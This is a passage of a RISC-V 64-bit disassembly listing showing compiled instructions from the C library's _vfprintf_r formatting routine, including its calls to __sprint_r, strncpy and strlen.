   11580:	85d2                	mv	a1,s4
   11582:	8556                	mv	a0,s5
   11584:	fc76                	sd	t4,56(sp)
   11586:	f87e                	sd	t6,48(sp)
   11588:	e416                	sd	t0,8(sp)
   1158a:	09b070ef          	jal	ra,18e24 <__sprint_r>
   1158e:	e6051ce3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11592:	7792                	ld	a5,288(sp)
   11594:	7ee2                	ld	t4,56(sp)
   11596:	7fc2                	ld	t6,48(sp)
   11598:	62a2                	ld	t0,8(sp)
   1159a:	835e                	mv	t1,s7
   1159c:	c98ff06f          	j	10a34 <_vfprintf_r+0x1ce>
   115a0:	0a10                	addi	a2,sp,272
   115a2:	85d2                	mv	a1,s4
   115a4:	8556                	mv	a0,s5
   115a6:	f876                	sd	t4,48(sp)
   115a8:	e47e                	sd	t6,8(sp)
   115aa:	07b070ef          	jal	ra,18e24 <__sprint_r>
   115ae:	e4051ce3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   115b2:	7792                	ld	a5,288(sp)
   115b4:	7ec2                	ld	t4,48(sp)
   115b6:	6fa2                	ld	t6,8(sp)
   115b8:	835e                	mv	t1,s7
   115ba:	cd2ff06f          	j	10a8c <_vfprintf_r+0x226>
   115be:	11812703          	lw	a4,280(sp)
   115c2:	0000b897          	auipc	a7,0xb
   115c6:	1f688893          	addi	a7,a7,502 # 1c7b8 <blanks.4520>
   115ca:	4c1d                	li	s8,7
   115cc:	009d4663          	blt	s10,s1,115d8 <_vfprintf_r+0xd72>
   115d0:	a081                	j	11610 <_vfprintf_r+0xdaa>
   115d2:	34c1                	addiw	s1,s1,-16
   115d4:	029d5e63          	bge	s10,s1,11610 <_vfprintf_r+0xdaa>
   115d8:	2705                	addiw	a4,a4,1
   115da:	07c1                	addi	a5,a5,16
   115dc:	01133023          	sd	a7,0(t1)
   115e0:	01a33423          	sd	s10,8(t1)
   115e4:	f23e                	sd	a5,288(sp)
   115e6:	10e12c23          	sw	a4,280(sp)
   115ea:	0341                	addi	t1,t1,16
   115ec:	feec53e3          	bge	s8,a4,115d2 <_vfprintf_r+0xd6c>
   115f0:	0a10                	addi	a2,sp,272
   115f2:	85d2                	mv	a1,s4
   115f4:	8556                	mv	a0,s5
   115f6:	e446                	sd	a7,8(sp)
   115f8:	02d070ef          	jal	ra,18e24 <__sprint_r>
   115fc:	e00515e3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11600:	34c1                	addiw	s1,s1,-16
   11602:	7792                	ld	a5,288(sp)
   11604:	11812703          	lw	a4,280(sp)
   11608:	68a2                	ld	a7,8(sp)
   1160a:	835e                	mv	t1,s7
   1160c:	fc9d46e3          	blt	s10,s1,115d8 <_vfprintf_r+0xd72>
   11610:	0017069b          	addiw	a3,a4,1
   11614:	97a6                	add	a5,a5,s1
   11616:	01133023          	sd	a7,0(t1)
   1161a:	00933423          	sd	s1,8(t1)
   1161e:	f23e                	sd	a5,288(sp)
   11620:	10d12c23          	sw	a3,280(sp)
   11624:	471d                	li	a4,7
   11626:	cad75663          	bge	a4,a3,10ad2 <_vfprintf_r+0x26c>
   1162a:	0a10                	addi	a2,sp,272
   1162c:	85d2                	mv	a1,s4
   1162e:	8556                	mv	a0,s5
   11630:	7f4070ef          	jal	ra,18e24 <__sprint_r>
   11634:	dc0519e3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11638:	7792                	ld	a5,288(sp)
   1163a:	c98ff06f          	j	10ad2 <_vfprintf_r+0x26c>
   1163e:	562e                	lw	a2,232(sp)
   11640:	3ec05e63          	blez	a2,11a3c <_vfprintf_r+0x11d6>
   11644:	6766                	ld	a4,88(sp)
   11646:	7682                	ld	a3,32(sp)
   11648:	00070c1b          	sext.w	s8,a4
   1164c:	28e6c263          	blt	a3,a4,118d0 <_vfprintf_r+0x106a>
   11650:	03805263          	blez	s8,11674 <_vfprintf_r+0xe0e>
   11654:	11812703          	lw	a4,280(sp)
   11658:	97e2                	add	a5,a5,s8
   1165a:	01933023          	sd	s9,0(t1)
   1165e:	0017069b          	addiw	a3,a4,1
   11662:	01833423          	sd	s8,8(t1)
   11666:	f23e                	sd	a5,288(sp)
   11668:	10d12c23          	sw	a3,280(sp)
   1166c:	471d                	li	a4,7
   1166e:	0341                	addi	t1,t1,16
   11670:	6ed74d63          	blt	a4,a3,11d6a <_vfprintf_r+0x1504>
   11674:	fffc4713          	not	a4,s8
   11678:	977d                	srai	a4,a4,0x3f
   1167a:	00ec7c33          	and	s8,s8,a4
   1167e:	6766                	ld	a4,88(sp)
   11680:	41870c3b          	subw	s8,a4,s8
   11684:	33804c63          	bgtz	s8,119bc <_vfprintf_r+0x1156>
   11688:	66e6                	ld	a3,88(sp)
   1168a:	4004f713          	andi	a4,s1,1024
   1168e:	00dc8db3          	add	s11,s9,a3
   11692:	54071f63          	bnez	a4,11bf0 <_vfprintf_r+0x138a>
   11696:	572e                	lw	a4,232(sp)
   11698:	7682                	ld	a3,32(sp)
   1169a:	00d74663          	blt	a4,a3,116a6 <_vfprintf_r+0xe40>
   1169e:	0014f693          	andi	a3,s1,1
   116a2:	6e068063          	beqz	a3,11d82 <_vfprintf_r+0x151c>
   116a6:	76e6                	ld	a3,120(sp)
   116a8:	7646                	ld	a2,112(sp)
   116aa:	0341                	addi	t1,t1,16
   116ac:	fed33823          	sd	a3,-16(t1)
   116b0:	11812683          	lw	a3,280(sp)
   116b4:	97b2                	add	a5,a5,a2
   116b6:	fec33c23          	sd	a2,-8(t1)
   116ba:	2685                	addiw	a3,a3,1
   116bc:	0006861b          	sext.w	a2,a3
   116c0:	10d12c23          	sw	a3,280(sp)
   116c4:	f23e                	sd	a5,288(sp)
   116c6:	469d                	li	a3,7
   116c8:	22c6c7e3          	blt	a3,a2,120f6 <_vfprintf_r+0x1890>
   116cc:	7682                	ld	a3,32(sp)
   116ce:	00dc8633          	add	a2,s9,a3
   116d2:	40e6873b          	subw	a4,a3,a4
   116d6:	41b6063b          	subw	a2,a2,s11
   116da:	0007069b          	sext.w	a3,a4
   116de:	00d65363          	bge	a2,a3,116e4 <_vfprintf_r+0xe7e>
   116e2:	8732                	mv	a4,a2
   116e4:	00070c9b          	sext.w	s9,a4
   116e8:	03905263          	blez	s9,1170c <_vfprintf_r+0xea6>
   116ec:	11812603          	lw	a2,280(sp)
   116f0:	97e6                	add	a5,a5,s9
   116f2:	01b33023          	sd	s11,0(t1)
   116f6:	0016059b          	addiw	a1,a2,1
   116fa:	01933423          	sd	s9,8(t1)
   116fe:	f23e                	sd	a5,288(sp)
   11700:	10b12c23          	sw	a1,280(sp)
   11704:	461d                	li	a2,7
   11706:	0341                	addi	t1,t1,16
   11708:	26b644e3          	blt	a2,a1,12170 <_vfprintf_r+0x190a>
   1170c:	fffccc13          	not	s8,s9
   11710:	43fc5c13          	srai	s8,s8,0x3f
   11714:	018cfc33          	and	s8,s9,s8
   11718:	41868c3b          	subw	s8,a3,s8
   1171c:	bb805563          	blez	s8,10ac6 <_vfprintf_r+0x260>
   11720:	11812703          	lw	a4,280(sp)
   11724:	3b8d5563          	bge	s10,s8,11ace <_vfprintf_r+0x1268>
   11728:	4c9d                	li	s9,7
   1172a:	a021                	j	11732 <_vfprintf_r+0xecc>
   1172c:	3c41                	addiw	s8,s8,-16
   1172e:	3b8d5063          	bge	s10,s8,11ace <_vfprintf_r+0x1268>
   11732:	2705                	addiw	a4,a4,1
   11734:	07c1                	addi	a5,a5,16
   11736:	01233023          	sd	s2,0(t1)
   1173a:	01a33423          	sd	s10,8(t1)
   1173e:	f23e                	sd	a5,288(sp)
   11740:	10e12c23          	sw	a4,280(sp)
   11744:	0341                	addi	t1,t1,16
   11746:	feecd3e3          	bge	s9,a4,1172c <_vfprintf_r+0xec6>
   1174a:	0a10                	addi	a2,sp,272
   1174c:	85d2                	mv	a1,s4
   1174e:	8556                	mv	a0,s5
   11750:	6d4070ef          	jal	ra,18e24 <__sprint_r>
   11754:	ca0519e3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11758:	7792                	ld	a5,288(sp)
   1175a:	11812703          	lw	a4,280(sp)
   1175e:	835e                	mv	t1,s7
   11760:	b7f1                	j	1172c <_vfprintf_r+0xec6>
   11762:	0014f513          	andi	a0,s1,1
   11766:	cc0518e3          	bnez	a0,11436 <_vfprintf_r+0xbd0>
   1176a:	00b33423          	sd	a1,8(t1)
   1176e:	f26e                	sd	s11,288(sp)
   11770:	10e12c23          	sw	a4,280(sp)
   11774:	469d                	li	a3,7
   11776:	18e6c163          	blt	a3,a4,118f8 <_vfprintf_r+0x1092>
   1177a:	2609                	addiw	a2,a2,2
   1177c:	02030313          	addi	t1,t1,32
   11780:	bb35                	j	114bc <_vfprintf_r+0xc56>
   11782:	d2d05de3          	blez	a3,114bc <_vfprintf_r+0xc56>
   11786:	4cdd50e3          	bge	s10,a3,12446 <_vfprintf_r+0x1be0>
   1178a:	4c9d                	li	s9,7
   1178c:	a031                	j	11798 <_vfprintf_r+0xf32>
   1178e:	36c1                	addiw	a3,a3,-16
   11790:	14dd5563          	bge	s10,a3,118da <_vfprintf_r+0x1074>
   11794:	0017089b          	addiw	a7,a4,1
   11798:	0dc1                	addi	s11,s11,16
   1179a:	012c3023          	sd	s2,0(s8)
   1179e:	01ac3423          	sd	s10,8(s8)
   117a2:	f26e                	sd	s11,288(sp)
   117a4:	0008871b          	sext.w	a4,a7
   117a8:	11112c23          	sw	a7,280(sp)
   117ac:	0c41                	addi	s8,s8,16
   117ae:	feecd0e3          	bge	s9,a4,1178e <_vfprintf_r+0xf28>
   117b2:	0a10                	addi	a2,sp,272
   117b4:	85d2                	mv	a1,s4
   117b6:	8556                	mv	a0,s5
   117b8:	e436                	sd	a3,8(sp)
   117ba:	66a070ef          	jal	ra,18e24 <__sprint_r>
   117be:	c40514e3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   117c2:	7d92                	ld	s11,288(sp)
   117c4:	11812703          	lw	a4,280(sp)
   117c8:	66a2                	ld	a3,8(sp)
   117ca:	8c5e                	mv	s8,s7
   117cc:	b7c9                	j	1178e <_vfprintf_r+0xf28>
   117ce:	01087793          	andi	a5,a6,16
   117d2:	eb8d                	bnez	a5,11804 <_vfprintf_r+0xf9e>
   117d4:	66c2                	ld	a3,16(sp)
   117d6:	04087793          	andi	a5,a6,64
   117da:	0006a983          	lw	s3,0(a3)
   117de:	36078c63          	beqz	a5,11b56 <_vfprintf_r+0x12f0>
   117e2:	19c2                	slli	s3,s3,0x30
   117e4:	0309d993          	srli	s3,s3,0x30
   117e8:	e83a                	sd	a4,16(sp)
   117ea:	4785                	li	a5,1
   117ec:	c26ff06f          	j	10c12 <_vfprintf_r+0x3ac>
   117f0:	0014f713          	andi	a4,s1,1
   117f4:	ac070963          	beqz	a4,10ac6 <_vfprintf_r+0x260>
   117f8:	b461                	j	11280 <_vfprintf_r+0xa1a>
   117fa:	6782                	ld	a5,0(sp)
   117fc:	8ca2                	mv	s9,s0
   117fe:	e31c                	sd	a5,0(a4)
   11800:	af8ff06f          	j	10af8 <_vfprintf_r+0x292>
   11804:	67c2                	ld	a5,16(sp)
   11806:	e83a                	sd	a4,16(sp)
   11808:	0007b983          	ld	s3,0(a5)
   1180c:	4785                	li	a5,1
   1180e:	c04ff06f          	j	10c12 <_vfprintf_r+0x3ac>
   11812:	67c2                	ld	a5,16(sp)
   11814:	639c                	ld	a5,0(a5)
   11816:	89be                	mv	s3,a5
   11818:	b90ff06f          	j	10ba8 <_vfprintf_r+0x342>
   1181c:	67c2                	ld	a5,16(sp)
   1181e:	0007b983          	ld	s3,0(a5)
   11822:	be4ff06f          	j	10c06 <_vfprintf_r+0x3a0>
   11826:	67c2                	ld	a5,16(sp)
   11828:	07bd                	addi	a5,a5,15
   1182a:	9bc1                	andi	a5,a5,-16
   1182c:	6394                	ld	a3,0(a5)
   1182e:	6798                	ld	a4,8(a5)
   11830:	07c1                	addi	a5,a5,16
   11832:	e83e                	sd	a5,16(sp)
   11834:	e236                	sd	a3,256(sp)
   11836:	e63a                	sd	a4,264(sp)
   11838:	c50ff06f          	j	10c88 <_vfprintf_r+0x422>
   1183c:	e83a                	sd	a4,16(sp)
   1183e:	47a5                	li	a5,9
   11840:	8826                	mv	a6,s1
   11842:	cb37f3e3          	bgeu	a5,s3,114e8 <_vfprintf_r+0xc82>
   11846:	40087793          	andi	a5,a6,1024
   1184a:	18c10c13          	addi	s8,sp,396
   1184e:	2781                	sext.w	a5,a5
   11850:	f002                	sd	zero,32(sp)
   11852:	85e2                	mv	a1,s8
   11854:	44a9                	li	s1,10
   11856:	4725                	li	a4,9
   11858:	0ff00693          	li	a3,255
   1185c:	a039                	j	1186a <_vfprintf_r+0x1004>
   1185e:	0299d633          	divu	a2,s3,s1
   11862:	9d3771e3          	bgeu	a4,s3,11224 <_vfprintf_r+0x9be>
   11866:	89b2                	mv	s3,a2
   11868:	85e6                	mv	a1,s9
   1186a:	7502                	ld	a0,32(sp)
   1186c:	fff58c93          	addi	s9,a1,-1
   11870:	2505                	addiw	a0,a0,1
   11872:	f02a                	sd	a0,32(sp)
   11874:	0299f633          	remu	a2,s3,s1
   11878:	0306061b          	addiw	a2,a2,48
   1187c:	fec58fa3          	sb	a2,-1(a1)
   11880:	dff9                	beqz	a5,1185e <_vfprintf_r+0xff8>
   11882:	7626                	ld	a2,104(sp)
   11884:	00064603          	lbu	a2,0(a2)
   11888:	fcc51be3          	bne	a0,a2,1185e <_vfprintf_r+0xff8>
   1188c:	fcd609e3          	beq	a2,a3,1185e <_vfprintf_r+0xff8>
   11890:	99377ae3          	bgeu	a4,s3,11224 <_vfprintf_r+0x9be>
   11894:	fc3e                	sd	a5,56(sp)
   11896:	67aa                	ld	a5,136(sp)
   11898:	65ca                	ld	a1,144(sp)
   1189a:	f81a                	sd	t1,48(sp)
   1189c:	40fc8cb3          	sub	s9,s9,a5
   118a0:	863e                	mv	a2,a5
   118a2:	8566                	mv	a0,s9
   118a4:	ec76                	sd	t4,24(sp)
   118a6:	e442                	sd	a6,8(sp)
   118a8:	07b050ef          	jal	ra,17122 <strncpy>
   118ac:	77a6                	ld	a5,104(sp)
   118ae:	0299d633          	divu	a2,s3,s1
   118b2:	6822                	ld	a6,8(sp)
   118b4:	0017c583          	lbu	a1,1(a5)
   118b8:	6ee2                	ld	t4,24(sp)
   118ba:	7342                	ld	t1,48(sp)
   118bc:	00b035b3          	snez	a1,a1
   118c0:	97ae                	add	a5,a5,a1
   118c2:	f4be                	sd	a5,104(sp)
   118c4:	f002                	sd	zero,32(sp)
   118c6:	77e2                	ld	a5,56(sp)
   118c8:	4725                	li	a4,9
   118ca:	0ff00693          	li	a3,255
   118ce:	bf61                	j	11866 <_vfprintf_r+0x1000>
   118d0:	00068c1b          	sext.w	s8,a3
   118d4:	d98040e3          	bgtz	s8,11654 <_vfprintf_r+0xdee>
   118d8:	bb71                	j	11674 <_vfprintf_r+0xe0e>
   118da:	0017061b          	addiw	a2,a4,1
   118de:	010c0713          	addi	a4,s8,16
   118e2:	9db6                	add	s11,s11,a3
   118e4:	00dc3423          	sd	a3,8(s8)
   118e8:	012c3023          	sd	s2,0(s8)
   118ec:	f26e                	sd	s11,288(sp)
   118ee:	10c12c23          	sw	a2,280(sp)
   118f2:	469d                	li	a3,7
   118f4:	44c6d563          	bge	a3,a2,11d3e <_vfprintf_r+0x14d8>
   118f8:	0a10                	addi	a2,sp,272
   118fa:	85d2                	mv	a1,s4
   118fc:	8556                	mv	a0,s5
   118fe:	526070ef          	jal	ra,18e24 <__sprint_r>
   11902:	b00512e3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11906:	11812603          	lw	a2,280(sp)
   1190a:	7d92                	ld	s11,288(sp)
   1190c:	1a010313          	addi	t1,sp,416
   11910:	2605                	addiw	a2,a2,1
   11912:	8c5e                	mv	s8,s7
   11914:	b665                	j	114bc <_vfprintf_r+0xc56>
   11916:	8826                	mv	a6,s1
   11918:	825ff06f          	j	1113c <_vfprintf_r+0x8d6>
   1191c:	0000b797          	auipc	a5,0xb
   11920:	d0478793          	addi	a5,a5,-764 # 1c620 <__clzdi2+0x1ae>
   11924:	f43e                	sd	a5,40(sp)
   11926:	66c2                	ld	a3,16(sp)
   11928:	0204f793          	andi	a5,s1,32
   1192c:	00868713          	addi	a4,a3,8
   11930:	c7f9                	beqz	a5,119fe <_vfprintf_r+0x1198>
   11932:	0006b983          	ld	s3,0(a3)
   11936:	0014f793          	andi	a5,s1,1
   1193a:	cf81                	beqz	a5,11952 <_vfprintf_r+0x10ec>
   1193c:	00098b63          	beqz	s3,11952 <_vfprintf_r+0x10ec>
   11940:	0024e493          	ori	s1,s1,2
   11944:	03000793          	li	a5,48
   11948:	0ef10023          	sb	a5,224(sp)
   1194c:	0fb100a3          	sb	s11,225(sp)
   11950:	2481                	sext.w	s1,s1
   11952:	bff4f493          	andi	s1,s1,-1025
   11956:	0004881b          	sext.w	a6,s1
   1195a:	e83a                	sd	a4,16(sp)
   1195c:	4789                	li	a5,2
   1195e:	ab4ff06f          	j	10c12 <_vfprintf_r+0x3ac>
   11962:	2004e493          	ori	s1,s1,512
   11966:	00144f03          	lbu	t5,1(s0)
   1196a:	2481                	sext.w	s1,s1
   1196c:	0405                	addi	s0,s0,1
   1196e:	82cff06f          	j	1099a <_vfprintf_r+0x134>
   11972:	0204e493          	ori	s1,s1,32
   11976:	00144f03          	lbu	t5,1(s0)
   1197a:	2481                	sext.w	s1,s1
   1197c:	0405                	addi	s0,s0,1
   1197e:	81cff06f          	j	1099a <_vfprintf_r+0x134>
   11982:	0a10                	addi	a2,sp,272
   11984:	85d2                	mv	a1,s4
   11986:	8556                	mv	a0,s5
   11988:	49c070ef          	jal	ra,18e24 <__sprint_r>
   1198c:	a6051de3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11990:	7792                	ld	a5,288(sp)
   11992:	835e                	mv	t1,s7
   11994:	ba09                	j	112a6 <_vfprintf_r+0xa40>
   11996:	0000b797          	auipc	a5,0xb
   1199a:	c7278793          	addi	a5,a5,-910 # 1c608 <__clzdi2+0x196>
   1199e:	f43e                	sd	a5,40(sp)
   119a0:	b759                	j	11926 <_vfprintf_r+0x10c0>
   119a2:	4799                	li	a5,6
   119a4:	000e8c1b          	sext.w	s8,t4
   119a8:	3dd7eb63          	bltu	a5,t4,11d7e <_vfprintf_r+0x1518>
   119ac:	89e2                	mv	s3,s8
   119ae:	e836                	sd	a3,16(sp)
   119b0:	0000bc97          	auipc	s9,0xb
   119b4:	c88c8c93          	addi	s9,s9,-888 # 1c638 <__clzdi2+0x1c6>
   119b8:	854ff06f          	j	10a0c <_vfprintf_r+0x1a6>
   119bc:	11812703          	lw	a4,280(sp)
   119c0:	218d5063          	bge	s10,s8,11bc0 <_vfprintf_r+0x135a>
   119c4:	4d9d                	li	s11,7
   119c6:	a021                	j	119ce <_vfprintf_r+0x1168>
   119c8:	3c41                	addiw	s8,s8,-16
   119ca:	1f8d5b63          	bge	s10,s8,11bc0 <_vfprintf_r+0x135a>
   119ce:	2705                	addiw	a4,a4,1
   119d0:	07c1                	addi	a5,a5,16
   119d2:	01233023          	sd	s2,0(t1)
   119d6:	01a33423          	sd	s10,8(t1)
   119da:	f23e                	sd	a5,288(sp)
   119dc:	10e12c23          	sw	a4,280(sp)
   119e0:	0341                	addi	t1,t1,16
   119e2:	feedd3e3          	bge	s11,a4,119c8 <_vfprintf_r+0x1162>
   119e6:	0a10                	addi	a2,sp,272
   119e8:	85d2                	mv	a1,s4
   119ea:	8556                	mv	a0,s5
   119ec:	438070ef          	jal	ra,18e24 <__sprint_r>
   119f0:	a0051be3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   119f4:	7792                	ld	a5,288(sp)
   119f6:	11812703          	lw	a4,280(sp)
   119fa:	835e                	mv	t1,s7
   119fc:	b7f1                	j	119c8 <_vfprintf_r+0x1162>
   119fe:	0104f793          	andi	a5,s1,16
   11a02:	c3cd                	beqz	a5,11aa4 <_vfprintf_r+0x123e>
   11a04:	67c2                	ld	a5,16(sp)
   11a06:	0007b983          	ld	s3,0(a5)
   11a0a:	b735                	j	11936 <_vfprintf_r+0x10d0>
   11a0c:	0a10                	addi	a2,sp,272
   11a0e:	85d2                	mv	a1,s4
   11a10:	8556                	mv	a0,s5
   11a12:	412070ef          	jal	ra,18e24 <__sprint_r>
   11a16:	9e0518e3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11a1a:	7d92                	ld	s11,288(sp)
   11a1c:	11812703          	lw	a4,280(sp)
   11a20:	8c5e                	mv	s8,s7
   11a22:	b41d                	j	11448 <_vfprintf_r+0xbe2>
   11a24:	0a10                	addi	a2,sp,272
   11a26:	85d2                	mv	a1,s4
   11a28:	8556                	mv	a0,s5
   11a2a:	3fa070ef          	jal	ra,18e24 <__sprint_r>
   11a2e:	9c051ce3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11a32:	7d92                	ld	s11,288(sp)
   11a34:	11812703          	lw	a4,280(sp)
   11a38:	8c5e                	mv	s8,s7
   11a3a:	bc0d                	j	1146c <_vfprintf_r+0xc06>
   11a3c:	11812703          	lw	a4,280(sp)
   11a40:	0000b697          	auipc	a3,0xb
   11a44:	c0068693          	addi	a3,a3,-1024 # 1c640 <__clzdi2+0x1ce>
   11a48:	00d33023          	sd	a3,0(t1)
   11a4c:	2705                	addiw	a4,a4,1
   11a4e:	4685                	li	a3,1
   11a50:	0785                	addi	a5,a5,1
   11a52:	00d33423          	sd	a3,8(t1)
   11a56:	10e12c23          	sw	a4,280(sp)
   11a5a:	0007069b          	sext.w	a3,a4
   11a5e:	f23e                	sd	a5,288(sp)
   11a60:	471d                	li	a4,7
   11a62:	0341                	addi	t1,t1,16
   11a64:	2ed74363          	blt	a4,a3,11d4a <_vfprintf_r+0x14e4>
   11a68:	c4061363          	bnez	a2,10eae <_vfprintf_r+0x648>
   11a6c:	7682                	ld	a3,32(sp)
   11a6e:	0014f713          	andi	a4,s1,1
   11a72:	8f55                	or	a4,a4,a3
   11a74:	e319                	bnez	a4,11a7a <_vfprintf_r+0x1214>
   11a76:	850ff06f          	j	10ac6 <_vfprintf_r+0x260>
   11a7a:	76e6                	ld	a3,120(sp)
   11a7c:	7746                	ld	a4,112(sp)
   11a7e:	00d33023          	sd	a3,0(t1)
   11a82:	11812683          	lw	a3,280(sp)
   11a86:	97ba                	add	a5,a5,a4
   11a88:	00e33423          	sd	a4,8(t1)
   11a8c:	2685                	addiw	a3,a3,1
   11a8e:	0006871b          	sext.w	a4,a3
   11a92:	10d12c23          	sw	a3,280(sp)
   11a96:	f23e                	sd	a5,288(sp)
   11a98:	469d                	li	a3,7
   11a9a:	c2e6cd63          	blt	a3,a4,10ed4 <_vfprintf_r+0x66e>
   11a9e:	0341                	addi	t1,t1,16
   11aa0:	c54ff06f          	j	10ef4 <_vfprintf_r+0x68e>
   11aa4:	66c2                	ld	a3,16(sp)
   11aa6:	0404f793          	andi	a5,s1,64
   11aaa:	0006a983          	lw	s3,0(a3)
   11aae:	cbe1                	beqz	a5,11b7e <_vfprintf_r+0x1318>
   11ab0:	19c2                	slli	s3,s3,0x30
   11ab2:	0309d993          	srli	s3,s3,0x30
   11ab6:	b541                	j	11936 <_vfprintf_r+0x10d0>
   11ab8:	0a10                	addi	a2,sp,272
   11aba:	85d2                	mv	a1,s4
   11abc:	8556                	mv	a0,s5
   11abe:	366070ef          	jal	ra,18e24 <__sprint_r>
   11ac2:	940512e3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11ac6:	7792                	ld	a5,288(sp)
   11ac8:	835e                	mv	t1,s7
   11aca:	faeff06f          	j	11278 <_vfprintf_r+0xa12>
   11ace:	0017069b          	addiw	a3,a4,1
   11ad2:	8736                	mv	a4,a3
   11ad4:	97e2                	add	a5,a5,s8
   11ad6:	01233023          	sd	s2,0(t1)
   11ada:	fdbfe06f          	j	10ab4 <_vfprintf_r+0x24e>
   11ade:	6512                	ld	a0,256(sp)
   11ae0:	65b2                	ld	a1,264(sp)
   11ae2:	4601                	li	a2,0
   11ae4:	4681                	li	a3,0
   11ae6:	e41a                	sd	t1,8(sp)
   11ae8:	6f0090ef          	jal	ra,1b1d8 <__letf2>
   11aec:	6322                	ld	t1,8(sp)
   11aee:	54054763          	bltz	a0,1203c <_vfprintf_r+0x17d6>
   11af2:	0df14783          	lbu	a5,223(sp)
   11af6:	04700713          	li	a4,71
   11afa:	0000bc97          	auipc	s9,0xb
   11afe:	aeec8c93          	addi	s9,s9,-1298 # 1c5e8 <__clzdi2+0x176>
   11b02:	25b74f63          	blt	a4,s11,11d60 <_vfprintf_r+0x14fa>
   11b06:	f7f4f493          	andi	s1,s1,-129
   11b0a:	ec02                	sd	zero,24(sp)
   11b0c:	e882                	sd	zero,80(sp)
   11b0e:	f082                	sd	zero,96(sp)
   11b10:	ec82                	sd	zero,88(sp)
   11b12:	2481                	sext.w	s1,s1
   11b14:	498d                	li	s3,3
   11b16:	4c0d                	li	s8,3
   11b18:	4e81                	li	t4,0
   11b1a:	8c079863          	bnez	a5,10bea <_vfprintf_r+0x384>
   11b1e:	ef9fe06f          	j	10a16 <_vfprintf_r+0x1b0>
   11b22:	8566                	mv	a0,s9
   11b24:	e41a                	sd	t1,8(sp)
   11b26:	e836                	sd	a3,16(sp)
   11b28:	cabfe0ef          	jal	ra,107d2 <strlen>
   11b2c:	00050c1b          	sext.w	s8,a0
   11b30:	fffc4993          	not	s3,s8
   11b34:	0df14783          	lbu	a5,223(sp)
   11b38:	43f9d993          	srai	s3,s3,0x3f
   11b3c:	013c79b3          	and	s3,s8,s3
   11b40:	ec02                	sd	zero,24(sp)
   11b42:	e882                	sd	zero,80(sp)
   11b44:	f082                	sd	zero,96(sp)
   11b46:	ec82                	sd	zero,88(sp)
   11b48:	6322                	ld	t1,8(sp)
   11b4a:	2981                	sext.w	s3,s3
   11b4c:	4e81                	li	t4,0
   11b4e:	88079e63          	bnez	a5,10bea <_vfprintf_r+0x384>
   11b52:	ec5fe06f          	j	10a16 <_vfprintf_r+0x1b0>
   11b56:	20087793          	andi	a5,a6,512
   11b5a:	26078463          	beqz	a5,11dc2 <_vfprintf_r+0x155c>
   11b5e:	0ff9f993          	andi	s3,s3,255
   11b62:	e83a                	sd	a4,16(sp)
   11b64:	4785                	li	a5,1
   11b66:	8acff06f          	j	10c12 <_vfprintf_r+0x3ac>
   11b6a:	2004f793          	andi	a5,s1,512
   11b6e:	24078463          	beqz	a5,11db6 <_vfprintf_r+0x1550>
   11b72:	67c2                	ld	a5,16(sp)
   11b74:	00078983          	lb	s3,0(a5)
   11b78:	87ce                	mv	a5,s3
   11b7a:	82eff06f          	j	10ba8 <_vfprintf_r+0x342>
   11b7e:	2004f793          	andi	a5,s1,512
   11b82:	24078763          	beqz	a5,11dd0 <_vfprintf_r+0x156a>
   11b86:	0ff9f993          	andi	s3,s3,255
   11b8a:	b375                	j	11936 <_vfprintf_r+0x10d0>
   11b8c:	2004f793          	andi	a5,s1,512
   11b90:	20078e63          	beqz	a5,11dac <_vfprintf_r+0x1546>
   11b94:	0ff9f993          	andi	s3,s3,255
   11b98:	86eff06f          	j	10c06 <_vfprintf_r+0x3a0>
   11b9c:	67b2                	ld	a5,264(sp)
   11b9e:	2207cd63          	bltz	a5,11dd8 <_vfprintf_r+0x1572>
   11ba2:	0df14783          	lbu	a5,223(sp)
   11ba6:	04700713          	li	a4,71
   11baa:	0000bc97          	auipc	s9,0xb
   11bae:	a4ec8c93          	addi	s9,s9,-1458 # 1c5f8 <__clzdi2+0x186>
   11bb2:	f5b75ae3          	bge	a4,s11,11b06 <_vfprintf_r+0x12a0>
   11bb6:	0000bc97          	auipc	s9,0xb
   11bba:	a4ac8c93          	addi	s9,s9,-1462 # 1c600 <__clzdi2+0x18e>
   11bbe:	b7a1                	j	11b06 <_vfprintf_r+0x12a0>
   11bc0:	0017069b          	addiw	a3,a4,1
   11bc4:	97e2                	add	a5,a5,s8
   11bc6:	01233023          	sd	s2,0(t1)
   11bca:	01833423          	sd	s8,8(t1)
   11bce:	f23e                	sd	a5,288(sp)
   11bd0:	10d12c23          	sw	a3,280(sp)
   11bd4:	471d                	li	a4,7
   11bd6:	0341                	addi	t1,t1,16
   11bd8:	aad758e3          	bge	a4,a3,11688 <_vfprintf_r+0xe22>
   11bdc:	0a10                	addi	a2,sp,272
   11bde:	85d2                	mv	a1,s4
   11be0:	8556                	mv	a0,s5
   11be2:	242070ef          	jal	ra,18e24 <__sprint_r>
   11be6:	820510e3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11bea:	7792                	ld	a5,288(sp)
   11bec:	835e                	mv	t1,s7
   11bee:	bc69                	j	11688 <_vfprintf_r+0xe22>
   11bf0:	7702                	ld	a4,32(sp)
   11bf2:	4c1d                	li	s8,7
   11bf4:	9766                	add	a4,a4,s9
   11bf6:	f83a                	sd	a4,48(sp)
   11bf8:	7706                	ld	a4,96(sp)
   11bfa:	cb49                	beqz	a4,11c8c <_vfprintf_r+0x1426>
   11bfc:	6746                	ld	a4,80(sp)
   11bfe:	eb51                	bnez	a4,11c92 <_vfprintf_r+0x142c>
   11c00:	7726                	ld	a4,104(sp)
   11c02:	177d                	addi	a4,a4,-1
   11c04:	f4ba                	sd	a4,104(sp)
   11c06:	7706                	ld	a4,96(sp)
   11c08:	377d                	addiw	a4,a4,-1
   11c0a:	f0ba                	sd	a4,96(sp)
   11c0c:	674a                	ld	a4,144(sp)
   11c0e:	66aa                	ld	a3,136(sp)
   11c10:	0341                	addi	t1,t1,16
   11c12:	fee33823          	sd	a4,-16(t1)
   11c16:	11812703          	lw	a4,280(sp)
   11c1a:	97b6                	add	a5,a5,a3
